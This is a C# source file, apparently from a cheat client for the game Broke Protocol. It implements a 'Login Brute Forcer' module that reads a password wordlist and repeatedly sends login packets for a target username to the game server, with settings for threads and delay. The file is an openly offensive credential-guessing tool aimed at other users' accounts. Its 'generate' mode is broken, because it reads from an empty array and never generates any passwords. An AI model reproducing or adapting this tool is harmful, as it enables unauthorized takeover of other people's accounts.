using BrokeProtocol.Client.UI;
using BrokeProtocol.Managers;
using BrokeProtocol.Utility.Networking;
using BrokeProtocolClient.settings;
using BrokeProtocolClient.utils;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System;
using System.Threading.Tasks;
using UnityEngine;

namespace BrokeProtocolClient.modules.exploit
{
    class BruteForcer : Module
    {
        ModeSetting mode = new ModeSetting("Mode", Mode.file);

        InputSetting username = new InputSetting("username", 16, PlayerPrefs.GetString("Username"));
        FileSetting file = new FileSetting("Passwords file", FileManager.MainFolderPath + FileManager.PasswordsFile);

        NumberSetting length = new NumberSetting("Password length", 3, 16, 5, 1);
        InputSetting chars = new InputSetting("Password characters", int.MaxValue, "abcdefghijklmnopqrstuvwxyz");

        NumberSetting threads = new NumberSetting("Threads)", 1, 32, 1, 1);
        NumberSetting delay = new NumberSetting("Delay (seconds)", 0, 2, 0, 0.01);
        BooleanSetting output = new BooleanSetting("Show output", true);

        InputSetting plaininput = new InputSetting("Hash string", 512, "");
        ActionSetting hashinput;

        IEnumerator bruteForceThread;

        private string characters = "0123456789abcdefghijklmnopqrstuvwxyz ";
        private string symbols = "!#$%\'()*+,-.:;=>?@[\\]^_`{|}~";

        public BruteForcer() : base(Categories.Exploit, "Login Brute Forcer", "Brute forces login credentials")
        {
            addSetting(mode);

            addSetting(username);
            addSetting(file);

            addSetting(length);
            addSetting(chars);

            addSetting(threads);
            addSetting(delay);
            addSetting(output);

            addSetting(plaininput);

            hashinput = new ActionSetting("Hash", HashInput);
            addSetting(hashinput);
        }

        public override void onActivate()
        {
            if (bruteForceThread != null) return;

            bruteForceThread = BruteForceThread();
            getClient().StartCoroutine(bruteForceThread);
        }

        public override void onDeactivate()
        {
            if (bruteForceThread == null) return;

            getClient().StopCoroutine(bruteForceThread);
            bruteForceThread = null;
        }

        private IEnumerator BruteForceThread()
        {
            string[] passwords = new string[0];
            long iterations = 0;

            if (mode.isMode((int)Mode.file))
            {
                passwords = File.ReadAllLines(FileManager.MainFolderPath + FileManager.PasswordsFile);
                iterations = passwords.Length;
            }

            if (mode.isMode((int)Mode.generate))
            {
                iterations = Mathf.RoundToInt(Mathf.Pow(chars.getValue().Length, length.getValueInt()));
            }

            ConsoleBase.WriteLine("[*] Brute force started:");
            for (int index = 0; index < iterations;)
            {
                if (!(getClient().ClManager.CurrentMenu is RegisterMenu))
                {
                    ConsoleBase.WriteLine("[-] Could not find Register Menu.");
                    setEnabled(false);
                    yield break;
                }

                for (int thread = 0; thread < threads.getValueInt(); thread++)
                {
                    string password = "";

                    if (mode.isMode((int)Mode.file))
                    {
                        password = passwords[index];
                    }

                    if (mode.isMode((int)Mode.generate))
                    {
                        password = passwords[index];
                    }

                    login(username.getValue(), password);
                    //if (output.isEnabled()) ConsoleBase.WriteLine($"[*] [Thread:{thread}] [Index:{index}] Trying {username.getValue()} {password}.");

                    index++;
                }

                if (delay.getValueFloat() == 0) yield return null;

                yield return new WaitForSeconds(delay.getValueFloat());
            }
            setEnabled(false);
        }

        private void login(string username, string password)
        {
            ConsoleBase.WriteLine($"[*] Trying {username} {password}.");

            getClient().ClManager.SendToServer((ENet.PacketFlags)1, SvPacket.Login, new object[]
            {
                username,
                Animator.StringToHash(password),
                ClManager.languageIndex,
                SystemInfo.deviceUniqueIdentifier,
                getClient().ClManager.profileURL
            });
        }


        private void HashInput()
        {
            Log($"{Animator.StringToHash(plaininput.getValue())}");
        }

        enum Mode
        {
            file,
            generate
        }


    }
}
